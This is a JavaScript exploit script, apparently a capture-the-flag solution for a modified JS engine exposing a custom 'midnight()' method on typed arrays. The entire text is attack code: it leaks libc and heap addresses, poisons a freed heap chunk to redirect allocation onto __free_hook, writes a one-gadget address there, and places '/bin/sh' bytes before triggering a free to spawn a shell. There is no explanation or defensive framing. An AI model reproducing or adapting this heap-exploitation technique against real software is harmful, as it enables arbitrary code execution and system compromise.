var tmp_buf = new ArrayBuffer(8)
var f64 = new Float64Array(tmp_buf)
var u32 = new Uint32Array(tmp_buf)
var BASE = 0x100000000

function f2i(f) {
    f64[0] = f
    return u32[0] + BASE*u32[1]
}
function i2f(i) {
    u32[0] = i % BASE
    u32[1] = i / BASE
    return f64[0]
}
function hex(i) {
    return "0x"+i.toString(16)
}

var buf = new ArrayBuffer(0x120);
var a = new Float64Array(0x110);
var buf = new ArrayBuffer(0x20);
var b = new Float64Array(0x10);
var buf = new ArrayBuffer(0x20);
var c = new Float64Array(0x10);
var buf = new ArrayBuffer(0x120);
var d = new Float64Array(0x110);

a.midnight()
b.midnight()
c.midnight()

libc_base = f2i(a[0]) - 0x1ecbe0
console.log("[*] libc @ " + hex(libc_base))

heap_base = f2i(c[0]) - 0x48cc0
console.log("[*] heap @ " + hex(heap_base))

free_hook = libc_base + 0x1eee48 - 0x20
system = libc_base + 0x522c0
gadget = libc_base + 0xe3b31    

c[0] = i2f(free_hook)

var buf = new ArrayBuffer(0x60);
var e = new Float64Array(buf);
e[0] = 13.37
e[1] = 26.67
var buf = new ArrayBuffer(0x60);
var e = new Float64Array(buf);
e[0] = i2f(gadget)

var buf2 = new Uint32Array(0x10);
buf2[0] = 0x6e69622f
buf2[1] = 0x68732f

buf2.midnight()